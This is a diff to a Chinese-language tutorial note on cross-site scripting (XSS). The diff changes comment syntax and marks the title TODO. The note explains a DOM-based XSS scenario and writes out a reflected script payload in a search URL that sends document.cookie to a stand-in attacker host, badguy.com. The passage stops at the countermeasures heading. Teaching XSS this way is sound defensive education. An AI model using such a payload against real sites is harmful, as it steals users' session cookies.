@@ -1,4 +1,4 @@
-# XSS 跨域脚本攻击(cross-site scripting)
+# TODO:XSS 跨域脚本攻击(cross-site scripting)
 
 注入攻击的一种，不会对服务器造成任何伤害，通过一些站内正常交互，例如发布评论等提交含有 JavaScript 内容的文本。
 这时如果服务端没有过滤或转义这些脚本，含有 JavaScript 脚本的内容发布到了页面上，其它用户访问页面的时候就会运行这些脚本。
@@ -7,7 +7,7 @@ XSS 攻击的主要用于获取用户信息(例如 Cookie)、在页面插入内�
 ## 攻击场景 Dom-Based XSS
 
 ```HTML
-// http://victim.com网站 后台代码
+<!-- http://victim.com网站 后台代码 -->
 <html>
 　　<title></title>
 　　<body>
@@ -15,14 +15,14 @@ XSS 攻击的主要用于获取用户信息(例如 Cookie)、在页面插入内�
 　　　　...
 　　</body>
 </html>
-// 攻击
-// step1 建立后台用来偷取用户信息
+<!-- 攻击 -->
+<!-- step1 建立后台用来偷取用户信息 -->
 http://badguy.com
-// step2 发送恶意链接，可以通过邮件 qq等
+<!-- step2 发送恶意链接，可以通过邮件 qq等 -->
 http://victim.com/search.asp?term=<script>window.open("http://badguy.com?cookie="+document.cookie)</script>
-// 这时只要用户点击这个连接，那么生成的页面中就包含可以指向的代码片段
+<!-- 这时只要用户点击这个连接，那么生成的页面中就包含可以指向的代码片段 -->
 <script>window.open("http://badguy.com?cookie="+document.cookie)</script>
-// 这个代码自动运行把用户的cookie发送到了攻击者的网站
+<!-- 这个代码自动运行把用户的cookie发送到了攻击者的网站 -->
 ```
 
 ## 应对策略
